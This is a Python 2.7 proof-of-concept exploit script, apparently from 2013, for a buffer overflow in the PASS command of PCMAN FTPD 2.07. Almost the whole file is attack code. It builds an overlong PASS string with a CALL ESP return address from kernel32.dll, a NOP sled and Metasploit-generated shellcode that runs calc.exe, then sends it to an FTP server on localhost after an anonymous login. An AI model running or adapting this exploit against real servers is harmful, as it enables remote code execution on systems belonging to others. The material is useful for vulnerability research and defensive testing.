#!/usr/bin/python2.7
# -*- coding: utf-8 -*-



\"\"\"
PCMAN FTPD 2.07 PASS Command Buffer Overflow
Author: Ottomatik
Date: 2013-07-31
Software : PCMAN FTPD
Version : 2.07
Tested On: Windows 7 SP1 - French;
Description:
    * The PASS Command is vulnerable to a buffer overflow;
    * Other commads may be vulnerable;
\"\"\"

# Modules import;

import socket

def main() :
    \"\"\"
    Main function;
    \"\"\"
    buf = \"PASS \"
    buf += \"A\" * 6102 # JUNK
    # 0x75670253
    buf += \"\\x53\\x02\\x67\\x75\" # @ CALL ESP Kernel32.dll
    buf += \"\\x90\" * 40 # NOPs
    
    # ShellCode : msfpayload windows_exec calc.exe, bad chars = 00,0A,0C,0D

    buf +=(\"\\xdd\\xc5\\xd9\\x74\\x24\\xf4\\x5a\\x31\\xc9\\xb8\\xd1\\x96\\xc1\\xcb\\xb1\"
\"\\x33\\x31\\x42\\x17\\x83\\xc2\\x04\\x03\\x93\\x85\\x23\\x3e\\xef\\x42\\x2a\"
\"\\xc1\\x0f\\x93\\x4d\\x4b\\xea\\xa2\\x5f\\x2f\\x7f\\x96\\x6f\\x3b\\x2d\\x1b\"
\"\\x1b\\x69\\xc5\\xa8\\x69\\xa6\\xea\\x19\\xc7\\x90\\xc5\\x9a\\xe9\\x1c\\x89\"
\"\\x59\\x6b\\xe1\\xd3\\x8d\\x4b\\xd8\\x1c\\xc0\\x8a\\x1d\\x40\\x2b\\xde\\xf6\"
\"\\x0f\\x9e\\xcf\\x73\\x4d\\x23\\xf1\\x53\\xda\\x1b\\x89\\xd6\\x1c\\xef\\x23\"
\"\\xd8\\x4c\\x40\\x3f\\x92\\x74\\xea\\x67\\x03\\x85\\x3f\\x74\\x7f\\xcc\\x34\"
\"\\x4f\\x0b\\xcf\\x9c\\x81\\xf4\\xfe\\xe0\\x4e\\xcb\\xcf\\xec\\x8f\\x0b\\xf7\"
\"\\x0e\\xfa\\x67\\x04\\xb2\\xfd\\xb3\\x77\\x68\\x8b\\x21\\xdf\\xfb\\x2b\\x82\"
\"\\xde\\x28\\xad\\x41\\xec\\x85\\xb9\\x0e\\xf0\\x18\\x6d\\x25\\x0c\\x90\\x90\"
\"\\xea\\x85\\xe2\\xb6\\x2e\\xce\\xb1\\xd7\\x77\\xaa\\x14\\xe7\\x68\\x12\\xc8\"
\"\\x4d\\xe2\\xb0\\x1d\\xf7\\xa9\\xde\\xe0\\x75\\xd4\\xa7\\xe3\\x85\\xd7\\x87\"
\"\\x8b\\xb4\\x5c\\x48\\xcb\\x48\\xb7\\x2d\\x23\\x03\\x9a\\x07\\xac\\xca\\x4e\"
\"\\x1a\\xb1\\xec\\xa4\\x58\\xcc\\x6e\\x4d\\x20\\x2b\\x6e\\x24\\x25\\x77\\x28\"
\"\\xd4\\x57\\xe8\\xdd\\xda\\xc4\\x09\\xf4\\xb8\\x8b\\x99\\x94\\x10\\x2e\\x1a\"
\"\\x3e\\x6d\")
    buf += \"\\r\\n\"
    
    clt_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clt_socket.connect((\"127.0.0.1\", 21))
    print clt_socket.recv(2048)
    clt_socket.send(\"USER anonymous\\r\\n\")
    print clt_socket.recv(2048)
    clt_socket.send(buf)
    print clt_socket.recv(2048)
    clt_socket.close()
    


if __name__ == \"__main__\" :
    main()
